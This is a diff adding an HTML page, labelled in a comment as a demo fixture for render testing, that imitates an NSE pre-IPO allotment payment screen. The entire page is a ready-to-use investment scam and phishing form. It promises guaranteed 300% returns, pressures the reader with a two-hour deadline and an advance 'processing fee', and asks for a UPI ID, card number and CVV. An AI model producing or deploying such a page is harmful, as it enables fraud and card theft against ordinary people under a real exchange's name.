@@ -1,0 +1,30 @@
+<!doctype html>
+<!-- DEMO FIXTURE: fake pre-IPO allotment payment page for render testing. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>NSE Pre-IPO Allotment — Confirm Payment</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#0f172a; color:#e2e8f0; }
+    .card { max-width:440px; margin:50px auto; background:#111c33; border:1px solid #26324d; border-radius:12px; padding:26px; }
+    h2 { color:#f6c453; }
+    .badge { background:#16a34a; color:#fff; padding:3px 8px; border-radius:20px; font-size:12px; }
+    input { width:100%; padding:11px; margin-top:10px; border:1px solid #33415c; border-radius:6px; background:#0b1120; color:#fff; box-sizing:border-box; }
+    button { width:100%; margin-top:16px; background:#f6c453; color:#111; border:0; padding:12px; border-radius:6px; font-weight:700; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <span class="badge">GUARANTEED 300% RETURNS</span>
+    <h2>Pre-IPO Allotment Confirmed 🎉</h2>
+    <p>Congratulations! Pay the refundable processing fee to lock your allotment. Limited slots — expires in 2 hours.</p>
+    <form action="/pay" method="post">
+      <input type="text" name="upi" placeholder="Your UPI ID (e.g. name@bank)" />
+      <input type="text" name="card" placeholder="Debit/Credit Card Number" />
+      <input type="text" name="cvv" placeholder="CVV" />
+      <input type="text" name="amount" placeholder="Processing fee ₹4999" />
+      <button type="submit">Pay &amp; Confirm Allotment</button>
+    </form>
+  </div>
+</body>
+</html>
